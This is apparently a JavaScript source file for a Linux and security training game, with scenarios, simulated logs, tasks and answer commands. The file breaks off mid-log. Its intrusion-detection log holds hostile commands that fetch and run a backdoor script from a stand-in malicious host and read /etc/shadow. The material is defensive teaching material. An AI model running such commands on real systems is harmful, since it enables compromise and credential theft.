// Security Analysis Lab - Command Camp
// Realistic cybersecurity and Linux admin scenarios

let currentRole = 'admin';
let currentScenario = 'system-monitoring';
let currentScore = 0;
let completedTasks = new Set();

// Role-based scenario data with realistic log files and challenges
const scenarios = {
    // System Administrator Scenarios
    'system-monitoring': {
        title: "System Monitoring",
        description: "Monitor system performance, resource usage, and identify potential issues.",
        logFile: `2024-01-15 10:00:01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:01:15 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 DF PROTO=TCP SPT=54322 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:02:30 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12347 DF PROTO=TCP SPT=54323 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:03:45 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12348 DF PROTO=TCP SPT=54324 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:05:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12349 DF PROTO=TCP SPT=54325 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:06:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12350 DF PROTO=TCP SPT=54326 DPT=21 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:07:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12351 DF PROTO=TCP SPT=54327 DPT=23 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:08:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12352 DF PROTO=TCP SPT=54328 DPT=25 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:10:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12353 DF PROTO=TCP SPT=54329 DPT=110 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:11:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12354 DF PROTO=TCP SPT=54330 DPT=143 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:12:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12355 DF PROTO=TCP SPT=54331 DPT=993 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:13:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12356 DF PROTO=TCP SPT=54332 DPT=995 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:15:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12357 DF PROTO=TCP SPT=54333 DPT=1433 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:16:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12358 DF PROTO=TCP SPT=54334 DPT=3306 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:17:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12359 DF PROTO=TCP SPT=54335 DPT=5432 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:18:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12360 DF PROTO=TCP SPT=54336 DPT=6379 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:20:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12361 DF PROTO=TCP SPT=54337 DPT=27017 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:21:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12362 DF PROTO=TCP SPT=54338 DPT=5984 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:22:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12363 DF PROTO=TCP SPT=54339 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:23:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12364 DF PROTO=TCP SPT=54340 DPT=8443 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:25:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12365 DF PROTO=TCP SPT=54341 DPT=9000 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:26:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12366 DF PROTO=TCP SPT=54342 DPT=9200 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:27:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12367 DF PROTO=TCP SPT=54343 DPT=11211 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:28:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12368 DF PROTO=TCP SPT=54344 DPT=27018 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:30:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12369 DF PROTO=TCP SPT=54345 DPT=50070 WINDOW=65535 RES=0x00 SYN URGP=0`,
        tasks: [
            {
                id: 'system_1',
                description: 'Check system uptime and load',
                command: 'uptime',
                points: 10,
                hint: 'Use uptime to check system status',
                answer: 'uptime'
            },
            {
                id: 'system_2',
                description: 'Monitor CPU and memory usage',
                command: 'top -n 1',
                points: 15,
                hint: 'Use top to see system processes',
                answer: 'top -n 1'
            },
            {
                id: 'system_3',
                description: 'Check disk space usage',
                command: 'df -h',
                points: 15,
                hint: 'Use df to check disk space',
                answer: 'df -h'
            },
            {
                id: 'system_4',
                description: 'List running processes',
                command: 'ps aux',
                points: 20,
                hint: 'Use ps to list processes',
                answer: 'ps aux'
            },
            {
                id: 'system_5',
                description: 'Check network connections',
                command: 'netstat -tuln',
                points: 20,
                hint: 'Use netstat to check network',
                answer: 'netstat -tuln'
            }
        ],
        hints: "Key commands: uptime, top, df, ps, netstat. Focus on system monitoring and resource management."
    },

    // Cybersecurity Analyst Scenarios
    'intrusion-detection': {
        title: "Intrusion Detection",
        description: "A security alert has been triggered. Analyze the system logs to identify potential unauthorized access and suspicious activities.",
        logFile: `2024-01-15 08:30:15 sshd[1234]: Accepted password for admin from 192.168.1.100 port 22
2024-01-15 08:31:22 sshd[1235]: Failed password for root from 192.168.1.101 port 22
2024-01-15 08:31:25 sshd[1236]: Failed password for root from 192.168.1.101 port 22
2024-01-15 08:31:28 sshd[1237]: Failed password for root from 192.168.1.101 port 22
2024-01-15 08:32:15 sshd[1238]: Accepted password for admin from 192.168.1.100 port 22
2024-01-15 08:35:42 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48109 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 08:36:18 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48110 DF PROTO=TCP SPT=54322 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 08:40:15 sshd[1240]: Accepted password for admin from 192.168.1.100 port 22
2024-01-15 08:42:33 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/passwd
2024-01-15 08:43:15 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/ls -la /var/log
2024-01-15 08:44:22 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
2024-01-15 08:45:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48111 DF PROTO=TCP SPT=54323 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 08:46:05 apache2[1245]: 192.168.1.101 - - [15/Jan/2024:08:46:05 +0000] "GET /admin HTTP/1.1" 404 485
2024-01-15 08:46:08 apache2[1246]: 192.168.1.101 - - [15/Jan/2024:08:46:08 +0000] "GET /wp-admin HTTP/1.1" 404 485
2024-01-15 08:46:12 apache2[1247]: 192.168.1.101 - - [15/Jan/2024:08:46:12 +0000] "GET /phpmyadmin HTTP/1.1" 404 485
2024-01-15 08:47:30 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48112 DF PROTO=TCP SPT=54324 DPT=3306 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 08:50:15 sshd[1250]: Accepted password for admin from 192.168.1.100 port 22
2024-01-15 08:52:45 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious-site.com/backdoor.sh
2024-01-15 08:53:20 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod +x /tmp/backdoor.sh
2024-01-15 08:54:10 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh
2024-01-15 08:55:30 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48113 DF PROTO=TCP SPT=54325 DPT=4444 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 09:00:15 sshd[1255]: Accepted password for admin from 192.168.1.100 port 22
2024-01-15 09:02:10 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/netstat -tulpn
2024-01-15 09:03:25 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/ps aux | grep backdoor
2024-01-15 09:05:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=10.0.2.2 DST=10.0.2.15 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=48114 DF PROTO=TCP SPT=54326 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0`,
        tasks: [
            {
                id: 'intrusion_1',
                description: 'Find all failed SSH login attempts in auth.log',
                command: 'grep "Failed password" auth.log',
                points: 15,
                hint: 'Use grep to search for "Failed password" in auth.log file',
                answer: 'grep "Failed password" auth.log'
            },
            {
                id: 'intrusion_2',
                description: 'Identify the suspicious IP address attempting brute force',
                command: 'grep "Failed password" auth.log | awk "{print $11}" | sort | uniq -c',
                points: 20,
                hint: 'Use awk to extract the IP address field and count occurrences',
                answer: 'grep "Failed password" auth.log | awk "{print $11}" | sort | uniq -c'
            },
            {
                id: 'intrusion_3',
                description: 'Find all sudo commands executed by the admin user',
                command: 'grep "sudo.*admin" auth.log',
                points: 15,
                hint: 'Search for sudo entries containing "admin" in auth.log',
                answer: 'grep "sudo.*admin" auth.log'
            },
            {
                id: 'intrusion_4',
                description: 'Detect the malicious download and execution',
                command: 'grep -E "(wget|backdoor)" auth.log',
                points: 25,
                hint: 'Use grep with extended regex to find wget or backdoor activities in auth.log',
                answer: 'grep -E "(wget|backdoor)" auth.log'
            },
            {
                id: 'intrusion_5',
                description: 'Count total UFW firewall blocks',
                command: 'grep "UFW BLOCK" auth.log | wc -l',
                points: 15,
                hint: 'Count lines containing "UFW BLOCK" in auth.log',
                answer: 'grep "UFW BLOCK" auth.log | wc -l'
            }
        ],
        hints: "Key commands: grep, awk, wc, sort, uniq. Focus on pattern matching and text processing."
    },

    'performance-analysis': {
        title: "Performance Analysis",
        description: "Analyze system performance metrics to identify bottlenecks and optimize resource usage.",
        logFile: `top - 14:30:15 up 2 days, 3:45, 2 users, load average: 2.34, 1.89, 1.23
Tasks: 156 total, 1 running, 155 sleeping, 0 stopped, 0 zombie
%Cpu(s): 15.2 us, 8.1 sy, 0.0 ni, 75.4 id, 0.8 wa, 0.0 hi, 0.5 si, 0.0 st
MiB Mem : 8192.0 total, 2345.2 free, 3456.8 used, 2389.9 buff/cache
MiB Swap: 2048.0 total, 1024.0 free, 1024.0 used. 3456.8 avail Mem

PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND
1234 root 20 0 2345678 123456 12345 S 45.2 12.3 2:34:56 java
2345 www-data 20 0 1234567 98765 5432 S 23.1 8.9 1:23:45 apache2
3456 mysql 20 0 3456789 234567 12345 S 18.7 15.2 3:45:67 mysqld
4567 user 20 0 567890 12345 2345 S 12.3 4.5 0:45:23 python
5678 user 20 0 234567 9876 1234 S 8.9 3.2 0:23:45 node
6789 user 20 0 123456 5432 1234 S 5.4 2.1 0:12:34 bash
7890 root 20 0 98765 4321 1234 S 3.2 1.8 0:05:43 systemd
8901 user 20 0 65432 3210 1234 S 2.1 1.2 0:03:21 sshd
9012 user 20 0 54321 2109 1234 S 1.8 0.9 0:02:15 nginx
0123 user 20 0 43210 1098 1234 S 1.5 0.7 0:01:54 docker`,
        tasks: [
            {
                id: 'performance_1',
                description: 'Check system load average',
                command: 'uptime',
                points: 10,
                hint: 'Use uptime to see load average',
                answer: 'uptime'
            },
            {
                id: 'performance_2',
                description: 'Identify the process using the most CPU',
                command: 'ps aux --sort=-%cpu | head -5',
                points: 20,
                hint: 'Use ps with sort by CPU usage',
                answer: 'ps aux --sort=-%cpu | head -5'
            },
            {
                id: 'performance_3',
                description: 'Find processes using more than 10% memory',
                command: 'ps aux | awk "$4 > 10"',
                points: 25,
                hint: 'Use awk to filter by memory percentage',
                answer: 'ps aux | awk "$4 > 10"'
            },
            {
                id: 'performance_4',
                description: 'Check memory usage summary',
                command: 'free -h',
                points: 15,
                hint: 'Use free to check memory',
                answer: 'free -h'
            },
            {
                id: 'performance_5',
                description: 'Monitor disk I/O activity',
                command: 'iostat -x 1 3',
                points: 30,
                hint: 'Use iostat for disk I/O monitoring',
                answer: 'iostat -x 1 3'
            }
        ],
        hints: "Key commands: top, ps, free, iostat, uptime. Focus on performance monitoring and resource analysis."
    },

    'troubleshooting': {
        title: "System Troubleshooting",
        description: "Diagnose and resolve system issues by analyzing logs and system state.",
        logFile: `2024-01-15 10:00:01 kernel: [ERROR] Out of memory: Kill process 1234 (java) score 987 or sacrifice child
2024-01-15 10:01:15 systemd[1]: Failed to start apache2.service: Unit apache2.service has a bad unit file setting.
2024-01-15 10:02:30 kernel: [WARN] EXT4-fs (sda1): Delayed allocation failed for inode 12345
2024-01-15 10:03:45 sshd[2345]: error: Could not load host key: /etc/ssh/ssh_host_rsa_key
2024-01-15 10:04:12 systemd[1]: mysql.service: Main process exited, code=exited, status=1
2024-01-15 10:05:33 kernel: [ERROR] ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
2024-01-15 10:06:18 systemd[1]: nginx.service: Failed to bind to 0.0.0.0:80 (Address already in use)
2024-01-15 10:07:45 kernel: [WARN] CPU temperature above threshold, cpu clock throttled
2024-01-15 10:08:22 systemd[1]: Failed to start docker.service: Unit docker.service not found.
2024-01-15 10:09:15 kernel: [ERROR] Out of memory: Kill process 2345 (apache2) score 654 or sacrifice child
2024-01-15 10:10:33 systemd[1]: Failed to start postgresql.service: Unit postgresql.service has a bad unit file setting.
2024-01-15 10:11:45 kernel: [WARN] EXT4-fs (sda1): Delayed allocation failed for inode 23456
2024-01-15 10:12:18 sshd[3456]: error: Could not load host key: /etc/ssh/ssh_host_ecdsa_key
2024-01-15 10:13:33 systemd[1]: redis.service: Main process exited, code=exited, status=1
2024-01-15 10:14:45 kernel: [ERROR] ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
2024-01-15 10:15:18 systemd[1]: mongodb.service: Failed to bind to 0.0.0.0:27017 (Address already in use)
2024-01-15 10:16:33 kernel: [WARN] CPU temperature above threshold, cpu clock throttled
2024-01-15 10:17:45 systemd[1]: Failed to start elasticsearch.service: Unit elasticsearch.service not found.`,
        tasks: [
            {
                id: 'troubleshoot_1',
                description: 'Check system error messages',
                command: 'dmesg | grep -i error',
                points: 15,
                hint: 'Use dmesg to check kernel messages',
                answer: 'dmesg | grep -i error'
            },
            {
                id: 'troubleshoot_2',
                description: 'Find failed systemd services',
                command: 'systemctl --failed',
                points: 20,
                hint: 'Use systemctl to check failed services',
                answer: 'systemctl --failed'
            },
            {
                id: 'troubleshoot_3',
                description: 'Check disk space issues',
                command: 'df -h | grep -E "(9[0-9]%|100%)"',
                points: 15,
                hint: 'Use df to check disk usage',
                answer: 'df -h | grep -E "(9[0-9]%|100%)"'
            },
            {
                id: 'troubleshoot_4',
                description: 'Identify memory issues',
                command: 'free -h && echo "---" && cat /proc/meminfo | grep -E "(MemAvailable|SwapTotal)"',
                points: 25,
                hint: 'Check memory and swap usage',
                answer: 'free -h && echo "---" && cat /proc/meminfo | grep -E "(MemAvailable|SwapTotal)"'
            },
            {
                id: 'troubleshoot_5',
                description: 'Check for port conflicts',
                command: 'netstat -tuln | grep -E ":(80|443|3306|27017)"',
                points: 25,
                hint: 'Use netstat to check port usage',
                answer: 'netstat -tuln | grep -E ":(80|443|3306|27017)"'
            }
        ],
        hints: "Key commands: dmesg, systemctl, df, free, netstat. Focus on error diagnosis and service management."
    },

    'backup-management': {
        title: "Backup Management",
        description: "Manage backup operations and verify data integrity across the system.",
        logFile: `2024-01-15 02:00:01 backup[1234]: Starting daily backup job
2024-01-15 02:01:15 backup[1234]: Backing up /home/user/documents (2.3 GB)
2024-01-15 02:05:33 backup[1234]: Backing up /var/www (1.8 GB)
2024-01-15 02:08:45 backup[1234]: Backing up /etc (156 MB)
2024-01-15 02:10:12 backup[1234]: Backing up /var/log (89 MB)
2024-01-15 02:12:30 backup[1234]: Compressing backup archive
2024-01-15 02:15:45 backup[1234]: Backup completed successfully (4.3 GB total)
2024-01-15 02:16:00 backup[1234]: Cleaning up old backups (keeping last 7 days)
2024-01-15 02:16:30 backup[1234]: Removed backup-2024-01-08.tar.gz (4.1 GB)
2024-01-15 02:17:00 backup[1234]: Backup job completed in 17 minutes

2024-01-15 14:00:01 backup[2345]: Starting weekly backup job
2024-01-15 14:01:15 backup[2345]: Backing up /home/user (5.2 GB)
2024-01-15 14:08:33 backup[2345]: Backing up /var (3.1 GB)
2024-01-15 14:15:45 backup[2345]: Backing up /opt (2.8 GB)
2024-01-15 14:22:12 backup[2345]: Backing up /usr/local (1.9 GB)
2024-01-15 14:25:30 backup[2345]: Compressing backup archive
2024-01-15 14:30:45 backup[2345]: Backup completed successfully (13.0 GB total)
2024-01-15 14:31:00 backup[2345]: Cleaning up old backups (keeping last 4 weeks)
2024-01-15 14:31:30 backup[2345]: Removed backup-2024-01-01.tar.gz (12.8 GB)
2024-01-15 14:32:00 backup[2345]: Backup job completed in 32 minutes`,
        tasks: [
            {
                id: 'backup_1',
                description: 'Check backup log entries in /var/log/syslog',
                command: 'grep "backup" /var/log/syslog',
                points: 10,
                hint: 'Search for backup entries in /var/log/syslog',
                answer: 'grep "backup" /var/log/syslog'
            },
            {
                id: 'backup_2',
                description: 'Find backup file sizes in /backups/',
                command: 'ls -lh /backups/ | grep tar.gz',
                points: 20,
                hint: 'List backup files with sizes in /backups/ directory',
                answer: 'ls -lh /backups/ | grep tar.gz'
            },
            {
                id: 'backup_3',
                description: 'Check backup completion times in backup.log',
                command: 'grep "completed" backup.log | tail -5',
                points: 15,
                hint: 'Find recent backup completions in backup.log',
                answer: 'grep "completed" backup.log | tail -5'
            },
            {
                id: 'backup_4',
                description: 'Verify backup integrity',
                command: 'tar -tzf backup-2024-01-15.tar.gz | wc -l',
                points: 25,
                hint: 'Check number of files in backup-2024-01-15.tar.gz',
                answer: 'tar -tzf backup-2024-01-15.tar.gz | wc -l'
            },
            {
                id: 'backup_5',
                description: 'Calculate total backup size in /backups/',
                command: 'du -sh /backups/',
                points: 20,
                hint: 'Use du to check directory size of /backups/',
                answer: 'du -sh /backups/'
            }
        ],
        hints: "Key commands: tar, du, ls, grep, wc. Focus on backup verification and management."
    },

    'network-analysis': {
        title: "Network Analysis",
        description: "Analyze network traffic and connection logs to identify unusual network activity and potential security threats.",
        logFile: `2024-01-15 10:00:01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:01:15 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 DF PROTO=TCP SPT=54322 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:02:30 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12347 DF PROTO=TCP SPT=54323 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:03:45 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12348 DF PROTO=TCP SPT=54324 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:05:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12349 DF PROTO=TCP SPT=54325 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:06:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12350 DF PROTO=TCP SPT=54326 DPT=21 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:07:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12351 DF PROTO=TCP SPT=54327 DPT=23 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:08:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12352 DF PROTO=TCP SPT=54328 DPT=25 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:10:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12353 DF PROTO=TCP SPT=54329 DPT=110 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:11:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12354 DF PROTO=TCP SPT=54330 DPT=143 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:12:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12355 DF PROTO=TCP SPT=54331 DPT=993 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:13:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12356 DF PROTO=TCP SPT=54332 DPT=995 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:15:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12357 DF PROTO=TCP SPT=54333 DPT=1433 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:16:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12358 DF PROTO=TCP SPT=54334 DPT=3306 WINDOW=65535 RES=0x00 SYN URGP=0
